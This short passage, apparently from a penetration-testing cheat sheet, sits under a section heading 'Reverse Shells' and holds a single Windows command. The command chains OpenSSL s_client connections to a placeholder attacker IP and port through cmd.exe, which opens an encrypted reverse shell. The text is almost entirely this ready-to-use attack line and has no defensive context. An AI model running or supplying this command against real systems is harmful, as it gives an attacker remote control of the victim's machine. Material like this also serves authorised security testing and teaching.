...
#### 3.2.1 - Reverse Shells

```
C:\> C:\Program Files\OpenSSL\bin\openssl.exe s_client -connect <attacker_IP>:<PORT> | cmd.exe | C:\Program Files\OpenSSL\bin\openssl.exe s_client -connect <attacker_IP>:<PORT>
```
